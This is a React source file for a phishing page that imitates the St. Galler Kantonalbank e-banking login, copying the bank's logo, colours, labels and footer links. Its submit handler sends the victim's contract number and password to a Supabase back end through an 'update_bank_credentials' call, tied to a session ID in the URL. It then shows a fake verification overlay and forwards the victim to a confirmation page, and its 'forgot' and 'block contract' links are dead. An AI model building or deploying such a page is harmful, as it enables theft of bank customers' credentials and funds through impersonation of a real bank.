import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ArrowRight } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import logoAsset from "@/assets/st-galler-kantonalbank-logo.svg.asset.json";

const GREEN = "#008751";

type Lang = "de" | "en";

const translations: Record<Lang, {
  pageTitle: string;
  loginTitle: string;
  contractNumber: string;
  password: string;
  submit: string;
  loading: string;
  forgot: string;
  block: string;
}> = {
  de: {
    pageTitle: "St. Galler Kantonalbank – E-Banking",
    loginTitle: "Login SGKB E-Banking",
    contractNumber: "Vertragsnummer",
    password: "Passwort",
    submit: "Login",
    loading: "Anmeldedaten werden überprüft...",
    forgot: "Login-Daten vergessen",
    block: "Vertrag sperren",
  },
  en: {
    pageTitle: "St. Galler Kantonalbank – E-banking",
    loginTitle: "Login SGKB E-banking",
    contractNumber: "Contract number",
    password: "Password",
    submit: "Login",
    loading: "Verifying login details...",
    forgot: "Forgot login details",
    block: "Block contract",
  },
};

const footerLinks = [
  { de: "Sicherheit", en: "Security", href: "https://www.sgkb.ch/de/e-banking/sicherheit" },
  { de: "Rechtliche Hinweise", en: "Legal notice", href: "https://www.sgkb.ch/de/e-banking/rechtliches" },
  { de: "Hilfe/Support", en: "Help/Support", href: "https://www.sgkb.ch/de/e-banking/hilfe" },
  { de: "Kontakt", en: "Contact", href: "https://www.sgkb.ch/de/e-banking/supportanfrage" },
];

const ChStGallerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("de");

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");

  useEffect(() => { window.scrollTo(0, 0); }, []);
  const t = translations[lang];
  usePageMeta(t.pageTitle, logoAsset.url);

  const handleSubmit = async () => {
    if (!canSubmit) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const canSubmit = vertragsnummer.trim().length > 0 && passwort.trim().length > 0;

  const inputClass =
    "w-full h-[48px] px-3 bg-white border border-[#bcbcbc] rounded-none text-[18px] " +
    "outline-none focus:outline focus:outline-[3px] focus:outline-offset-0 focus:outline-[#008751] focus:border-[#008751]";

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen bg-white flex flex-col">
        <div className="flex-1">
          <div className="max-w-[1100px] mx-auto px-6 pt-6 md:pt-10">
            {/* Header: logo left, language right */}
            <div className="flex items-start justify-between">
              <img src={logoAsset.url} alt="St. Galler Kantonalbank" className="h-[48px] md:h-[60px] object-contain" />
              <div className="flex items-center gap-3 text-[14px] text-[#3a3a3a] pt-2">
                <button
                  type="button"
                  onClick={() => setLang("de")}
                  className={lang === "de" ? "font-bold" : "font-normal underline"}
                >
                  DE
                </button>
                <span className="text-[#bcbcbc]">|</span>
                <button
                  type="button"
                  onClick={() => setLang("en")}
                  className={lang === "en" ? "font-bold" : "font-normal underline"}
                >
                  EN
                </button>
              </div>
            </div>

            {/* Headline */}
            <h1
              className="mt-10 text-[24px] md:text-[28px] font-bold"
              style={{ color: GREEN }}
            >
              {t.loginTitle}
            </h1>

            {/* Form */}
            <div className="mt-8 max-w-[480px]">
              <div className="space-y-5">
                <div>
                  <label htmlFor="sgkb-vnr" className="block text-[14px] text-[#3a3a3a] mb-2">
                    {t.contractNumber}
                  </label>
                  <input
                    id="sgkb-vnr"
                    type="text"
                    value={vertragsnummer}
                    onChange={(e) => setVertragsnummer(e.target.value)}
                    className={inputClass}
                  />
                </div>
                <div>
                  <label htmlFor="sgkb-pw" className="block text-[14px] text-[#3a3a3a] mb-2">
                    {t.password}
                  </label>
                  <input
                    id="sgkb-pw"
                    type="password"
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    className={inputClass}
                  />
                </div>
              </div>

              <div className="mt-8">
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={!canSubmit}
                  className={
                    "px-10 h-[44px] rounded-none text-[15px] font-medium transition-colors " +
                    (canSubmit
                      ? "bg-[#008751] text-white cursor-pointer hover:bg-[#007046]"
                      : "bg-[#dedfdf] text-[#705e60] cursor-not-allowed")
                  }
                >
                  {t.submit}
                </button>
              </div>

              <div className="mt-8 space-y-3">
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="flex items-center gap-2 text-[15px] underline"
                  style={{ color: GREEN }}
                >
                  <ArrowRight size={18} strokeWidth={2} />
                  {t.forgot}
                </a>
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="flex items-center gap-2 text-[15px] underline"
                  style={{ color: GREEN }}
                >
                  <ArrowRight size={18} strokeWidth={2} />
                  {t.block}
                </a>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="mt-16 py-6">
          <div className="max-w-[1100px] mx-auto px-6">
            <div className="flex flex-wrap items-center gap-x-3 gap-y-2 text-[13px]" style={{ color: "#6c6e70" }}>
              {footerLinks.map((link, i) => (
                <div key={link.href} className="flex items-center gap-x-3">
                  <a
                    href={link.href}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:underline"
                  >
                    {lang === "de" ? link.de : link.en}
                  </a>
                  {i < footerLinks.length - 1 && <span className="text-[#bcbcbc]">|</span>}
                </div>
              ))}
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChStGallerKantonalbank;
